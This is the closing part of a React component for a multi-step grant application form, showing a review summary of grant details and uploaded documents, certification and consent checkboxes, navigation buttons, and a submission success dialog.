                <div className="bg-muted/30 rounded-lg p-4 space-y-3">
                  <h3 className="font-semibold text-primary">Grant Details</h3>
                  <div className="grid grid-cols-2 gap-2 text-sm">
                    <span className="text-muted-foreground">Type:</span>
                    <span className="capitalize">{form.getValues("grantType")?.replace("-", " ")}</span>
                    <span className="text-muted-foreground">Amount:</span>
                    <span>${form.getValues("requestedAmount")?.replace("-", " - $")}</span>
                    <span className="text-muted-foreground">Organization:</span>
                    <span>{form.getValues("organizationName") || "Individual"}</span>
                  </div>
                </div>

                <div className="bg-muted/30 rounded-lg p-4 space-y-3">
                  <h3 className="font-semibold text-primary">Documents</h3>
                  <div className="space-y-2 text-sm">
                    <div className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-green-600" />
                      <span>ID Card: {idCardFile?.name || "Not uploaded"}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <CheckCircle2 className="w-4 h-4 text-green-600" />
                      <span>Bank Statement: {bankStatementFile?.name || "Not uploaded"}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <FileText className="w-4 h-4 text-primary" />
                      <span>Additional: {additionalDocs.length} file(s)</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Agreements */}
              <div className="space-y-4 pt-4 border-t border-border">
                <h3 className="font-semibold">Certifications & Agreements</h3>

                <FormField
                  control={form.control}
                  name="certifyInformation"
                  render={({ field }) => (
                    <FormItem className="flex flex-row items-start space-x-3 space-y-0">
                      <FormControl>
                        <Checkbox
                          checked={field.value}
                          onCheckedChange={field.onChange}
                        />
                      </FormControl>
                      <div className="space-y-1 leading-none">
                        <FormLabel className="font-normal">
                          I certify that all information provided in this application is true,
                          complete, and accurate to the best of my knowledge. *
                        </FormLabel>
                        <FormMessage />
                      </div>
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="agreeToTerms"
                  render={({ field }) => (
                    <FormItem className="flex flex-row items-start space-x-3 space-y-0">
                      <FormControl>
                        <Checkbox
                          checked={field.value}
                          onCheckedChange={field.onChange}
                        />
                      </FormControl>
                      <div className="space-y-1 leading-none">
                        <FormLabel className="font-normal">
                          I agree to the{" "}
                          <a href="#" className="text-primary underline">
                            Terms and Conditions
                          </a>{" "}
                          and{" "}
                          <a href="#" className="text-primary underline">
                            Privacy Policy
                          </a>
                          . *
                        </FormLabel>
                        <FormMessage />
                      </div>
                    </FormItem>
                  )}
                />

                <FormField
                  control={form.control}
                  name="authorizeBackground"
                  render={({ field }) => (
                    <FormItem className="flex flex-row items-start space-x-3 space-y-0">
                      <FormControl>
                        <Checkbox
                          checked={field.value}
                          onCheckedChange={field.onChange}
                        />
                      </FormControl>
                      <div className="space-y-1 leading-none">
                        <FormLabel className="font-normal">
                          I authorize a background check and verification of the information
                          provided in this application. *
                        </FormLabel>
                        <FormMessage />
                      </div>
                    </FormItem>
                  )}
                />
              </div>
            </div>
          )}

          {/* Navigation Buttons */}
          <div className="flex flex-col sm:flex-row justify-between gap-4 pt-4">
            {currentStep > 1 && (
              <Button
                type="button"
                variant="outline"
                onClick={prevStep}
                className="order-2 sm:order-1"
              >
                <ChevronLeft className="w-4 h-4 mr-2" />
                Previous
              </Button>
            )}
            {currentStep < 5 ? (
              <Button
                type="button"
                onClick={nextStep}
                className="order-1 sm:order-2 sm:ml-auto"
              >
                Next Step
                <ChevronRight className="w-4 h-4 ml-2" />
              </Button>
            ) : (
              <Button
                type="submit"
                variant="hero"
                size="lg"
                className="order-1 sm:order-2 sm:ml-auto"
                disabled={isSubmitting}
              >
                {isSubmitting ? "Submitting..." : "Submit Application"}
              </Button>
            )}
          </div>
        </form>
      </Form>

      {/* Success Dialog */}
      {submissionData && (
        <SubmissionSuccessDialog
          open={showSuccessDialog}
          onOpenChange={setShowSuccessDialog}
          applicationNumber={submissionData.applicationNumber}
          applicantName={submissionData.applicantName}
          email={submissionData.email}
        />
      )}
    </div>
  );
};

export default GrantApplicationForm;
